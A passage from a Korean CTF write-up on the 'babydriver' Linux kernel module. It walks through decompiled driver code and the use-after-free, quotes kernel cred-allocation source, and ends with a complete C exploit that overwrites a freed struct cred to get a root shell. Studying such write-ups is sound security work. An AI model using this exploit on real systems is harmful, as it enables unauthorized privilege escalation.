class="line">  <span class="keyword">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  result = <span class="number">-2L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_from_user();</span><br><span class="line">    result = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>전달받은 세 번째 인자가 <code>device_buf_len</code>보다 작을 경우 <code>copy_from_user()</code> 함수를 이용해 두 번째 인자로 전달받은 유저 공간의 데이터를 커널 영역에 전달합니다.</p>
<h5 id="babyread"><a href="#babyread" class="headerlink" title="babyread()"></a>babyread()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> __<span class="function">fastcall <span class="title">babyread</span><span class="params">(file *filp, <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  result = <span class="number">-2L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_to_user(buffer);</span><br><span class="line">    result = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>전달받은 세 번째 인자가 <code>device_buf_len</code>보다 작을 경우 <code>copy_to_user()</code> 함수를 이용해 커널 영역의 데이터를 두 번째 인자로 전달받은 유저 공간에 받아옵니다.</p>
<h5 id="babydriver-init"><a href="#babydriver-init" class="headerlink" title="babydriver_init()"></a>babydriver_init()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">babydriver_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> *<span class="title">v2</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)alloc_chrdev_region(&amp;babydev_no, <span class="number">0L</span>L, <span class="number">1L</span>L, <span class="string">"babydev"</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    cdev_init(&amp;cdev_0, &amp;fops);</span><br><span class="line">    cdev_0.owner = &amp;_this_module;</span><br><span class="line">    v1 = cdev_add(&amp;cdev_0, babydev_no, <span class="number">1L</span>L);</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = (class *)_class_create(&amp;_this_module, <span class="string">"babydev"</span>, &amp;babydev_no);</span><br><span class="line">      babydev_class = v2;</span><br><span class="line">      <span class="keyword">if</span> ( v2 )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = device_create(v2, <span class="number">0L</span>L, babydev_no, <span class="number">0L</span>L, <span class="string">"babydev"</span>);</span><br><span class="line">        v0 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v3 )</span><br><span class="line">          <span class="keyword">return</span> v0;</span><br><span class="line">        printk(&amp;unk_351);</span><br><span class="line">        class_destroy(babydev_class);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        printk(&amp;unk_33B);</span><br><span class="line">      &#125;</span><br><span class="line">      cdev_del(&amp;cdev_0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      printk(&amp;unk_327);</span><br><span class="line">    &#125;</span><br><span class="line">    unregister_chrdev_region(babydev_no, <span class="number">1L</span>L);</span><br><span class="line">    <span class="keyword">return</span> v1;</span><br><span class="line">  &#125;</span><br><span class="line">  printk(&amp;unk_309);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>해당 모듈이 커널에 추가될 경우 실행되는 함수입니다.</p>
<h5 id="babydriver-exit"><a href="#babydriver-exit" class="headerlink" title="babydriver_exit()"></a>babydriver_exit()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">babydriver_exit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  device_destroy(babydev_class, babydev_no);</span><br><span class="line">  class_destroy(babydev_class);</span><br><span class="line">  cdev_del(&amp;cdev_0);</span><br><span class="line">  unregister_chrdev_region(babydev_no, <span class="number">1L</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>해당 모듈이 커널에서 제거될 경우 실행되는 함수입니다.</p>
<h3 id="취약점-체이닝"><a href="#취약점-체이닝" class="headerlink" title="취약점 체이닝"></a>취약점 체이닝</h3><p>모듈의 크기가 작은만큼 취약점은 간단합니다.</p>
<p><code>babyioctl()</code> 함수로 원하는 크기의 heap 영역을 할당할 수 있고 디바이스를 <code>close()</code> 하면 실행되는 <code>babyrelease()</code> 함수를 이용해 <code>dangling pointer</code>를 연출할 수 있습니다.<br>또한 heap 할당을 관리하는 구조체가 전역 변수로 선언되어 있기 때문에, 서로 다른 file descriptor에서 같은 구조체를 참조합니다.</p>
<p>즉 uaf 취약점이 터지며 이를 이용해 중요한 데이터가 담긴 heap 영역을 공격자 임의대로 수정할 수 있습니다.</p>
<p>이를 이용해 <code>struct cred</code> , <code>struct tty_sturct</code>를 이용한 두 가지 방법으로 풀 수 있습니다.</p>
<hr>

<h2 id="struct-cred-exploit"><a href="#struct-cred-exploit" class="headerlink" title="struct cred exploit"></a>struct cred exploit</h2><p><code>struct cred</code>를 이용한 exploit 과정을 간단히 설명하자면 다음과 같습니다.</p>
<ol>
<li>디바이스를 두 번 <code>open()</code>합니다. (<code>baby1</code>, <code>baby2</code>)</li>
<li><code>baby1</code> file descriptor에서 <code>babyioctl()</code> 함수를 이용해 <code>struct cred</code>의 크기인 168byte 만큼의 heap을 할당합니다.</li>
<li><code>baby1</code>를 <code>close()</code>하여 <code>babyrelease()</code> 함수를 호출해 할당된 heap을 해제합니다. 여기서 heap 영역을 해제한 뒤 해당 주소를 저장한 구조체 멤버를 초기화하지 않아 <code>dangling pointer</code>가 발생합니다.</li>
<li>유저 공간에서 <code>fork()</code> 함수를 호출합니다.</li>
<li><code>baby2</code>에서 <code>babywrite()</code> 함수를 이용해 해제된 heap 영역에 할당된 <code>struct cred</code>의 <code>uid</code>와 <code>gid</code>멤버를 0으로 덮어씁니다. (root 권한 획득)</li>
<li>자식 프로세스에서 <code>system(&quot;/bin/sh&quot;);</code>를 실행합니다.</li>
</ol>
<p>유저 공간에서 <code>fork()</code> 함수를 호출할 경우 <code>struct cred</code>를 커널 메모리 공간에 할당하는 작업을 진행합니다.</p>
<p>지금부터 문제 커널 버전인 <code>linux kernel v4.4.72</code>의 소스 코드를 보며 exploit 원리를 설명하겠습니다.</p>
<h5 id="fork"><a href="#fork" class="headerlink" title="fork()"></a>fork()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">long</span> _do_fork(<span class="keyword">unsigned</span> <span class="keyword">long</span> clone_flags,</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_start,</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_size,</span><br><span class="line">        <span class="keyword">int</span> __user *parent_tidptr,</span><br><span class="line">        <span class="keyword">int</span> __user *child_tidptr,</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> tls)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">p</span>;</span></span><br><span class="line">    <span class="keyword">int</span> trace = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> nr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Determine whether and which event to report to ptracer.  When</span></span><br><span class="line"><span class="comment">     * called from kernel_thread or CLONE_UNTRACED is explicitly</span></span><br><span class="line"><span class="comment">     * requested, no event is reported; otherwise, report if the event</span></span><br><span class="line"><span class="comment">     * for the type of forking is enabled.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (!(clone_flags &amp; CLONE_UNTRACED)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (clone_flags &amp; CLONE_VFORK)</span><br><span class="line">            trace = PTRACE_EVENT_VFORK;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((clone_flags &amp; CSIGNAL) != SIGCHLD)</span><br><span class="line">            trace = PTRACE_EVENT_CLONE;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            trace = PTRACE_EVENT_FORK;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (likely(!ptrace_event_enabled(current, trace)))</span><br><span class="line">            trace = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    p = copy_process(clone_flags, stack_start, stack_size,      <span class="comment">// here</span></span><br><span class="line">            child_tidptr, <span class="literal">NULL</span>, trace, tls, NUMA_NO_NODE);</span><br></pre></td></tr></table></figure>
<p>위 코드는 <code>fork.c</code> 소스 코드의 main routine 부분입니다. 해당 코드를 보면 <code>copy_process()</code> 함수를 호출하는 것을 확인할 수 있습니다.</p>
<h5 id="copy-creds"><a href="#copy-creds" class="headerlink" title="copy_creds()"></a>copy_creds()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">copy_creds</span><span class="params">(struct task_struct *p, <span class="keyword">unsigned</span> <span class="keyword">long</span> clone_flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (</span><br><span class="line">#ifdef CONFIG_KEYS</span><br><span class="line">		!p-&gt;cred-&gt;thread_keyring &amp;&amp;</span><br><span class="line">#endif</span><br><span class="line">		clone_flags &amp; CLONE_THREAD</span><br><span class="line">	    ) &#123;</span><br><span class="line">		p-&gt;real_cred = get_cred(p-&gt;cred);</span><br><span class="line">		get_cred(p-&gt;cred);</span><br><span class="line">		alter_cred_subscribers(p-&gt;cred, <span class="number">2</span>);</span><br><span class="line">		kdebug(<span class="string">"share_creds(%p&#123;%d,%d&#125;)"</span>,</span><br><span class="line">		       p-&gt;cred, atomic_read(&amp;p-&gt;cred-&gt;usage),</span><br><span class="line">		       read_cred_subscribers(p-&gt;cred));</span><br><span class="line">		atomic_inc(&amp;p-&gt;cred-&gt;user-&gt;processes);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">new</span> = prepare_creds();   <span class="comment">// here</span></span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (clone_flags &amp; CLONE_NEWUSER) &#123;</span><br><span class="line">		ret = create_user_ns(<span class="keyword">new</span>);</span><br><span class="line">		<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">goto</span> error_put;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>위 코드는 <code>cred.c</code> 소스 코드 내의 <code>copy_creds</code> 함수 도입 부분입니다. 해당 코드를 보면 <code>prepare_creds()</code> 함수를 호출하는 것을 볼 수 있습니다.</p>
<h5 id="prepare-creds"><a href="#prepare-creds" class="headerlink" title="prepare_creds()"></a>prepare_creds()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * prepare_creds - Prepare a new set of credentials for modification</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Prepare a new set of task credentials for modification.  A task's creds</span></span><br><span class="line"><span class="comment"> * shouldn't generally be modified directly, therefore this function is used to</span></span><br><span class="line"><span class="comment"> * prepare a new copy, which the caller then modifies and then commits by</span></span><br><span class="line"><span class="comment"> * calling commit_creds().</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Preparation involves making a copy of the objective creds for modification.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns a pointer to the new creds-to-be if successful, NULL otherwise.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Call commit_creds() or abort_creds() to clean up.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">struct cred *<span class="title">prepare_creds</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span> = <span class="title">current</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">	validate_process_creds();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">new</span> = kmem_cache_alloc(cred_jar, GFP_KERNEL);    <span class="comment">// here</span></span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>
<p>위 코드 또한 <code>cred.c</code> 내의 <code>prepare_creds</code> 함수 도입 부분입니다. 해당 코드를 보면 <code>kmem_cache_alloc()</code> 함수를 호출해서 반환값을 변수 new에 저장하는 것을 확인할 수 있습니다.</p>
<p>바로 이 코드가 heap 영역에 <code>sizeof(struct cred)</code>만큼의 크기를 할당해서 해당 영역에 자식 프로세스의 권한 증명이 담긴 <code>struct cred</code>를 저장하는 코드입니다.</p>
<h5 id="struct-cred"><a href="#struct-cred" class="headerlink" title="struct cred"></a>struct cred</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="keyword">void</span>		*put_addr;</span><br><span class="line">	<span class="keyword">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="keyword">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we're permitted */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">void</span>		*security;	<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>strcut cred</code>는 위와 같이 구성되어 있으며 이 중 <code>kuid_t uid</code>와 <code>kgid_t gid</code> 멤버의 값을 0으로 만들어 주면, 해당 프로세스는 root의 권한을 가지게 됩니다.</p>
<p>즉 유저 공간에서 <code>fork()</code> 함수를 호출하면 <code>babyrelease()</code>함수로 해제된 168byte 만큼의 heap 영역에 <code>struct cred</code>가 들어오게 되고, 해당 영역에 대한 <code>dangling pointer</code>를 가지고 있는 <code>babydev_struct.device_buf</code>를 이용해 <code>struct cred</code>를 0으로 덮어주면 root 권한을 획득하게 되는 것입니다.</p>
<h5 id="exploit-code"><a href="#exploit-code" class="headerlink" title="exploit code"></a>exploit code</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> baby1 = open(<span class="string">"/dev/babydev"</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">int</span> baby2 = open(<span class="string">"/dev/babydev"</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    ioctl(baby1, <span class="number">65537</span>, <span class="number">168</span>);</span><br><span class="line">    close(baby1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> pid = fork();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(pid &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"ERROR"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">char</span> fake_cred[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">        write(baby2, fake_cred, <span class="number">28</span>);</span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(getuid() == <span class="number">0</span>) &#123;</span><br><span class="line">            system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        wait(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(baby2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>exploit을 다 작성했으면 -static 옵션으로 정적 컴파일해서, 환경 설정 과정에서 <code>rootfs.cpio</code> 파일 시스템의 압축을 풀었던 디렉토리에 옮긴 뒤에</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . | cpio -o --format=newc &gt; rootfs.cpio</span><br></pre></td></tr></table></figure>
<p>위 명령어로 압축하면 새로운 <code>roofts.cpio</code> 파일이 나오는데 이 <code>rootfs.cpio</code> 파일을 이용해서 qemu를 실행하시면 해당 exploit 파일이 qemu 내부로 들어간 것을 확인할 수 있습니다.</p>
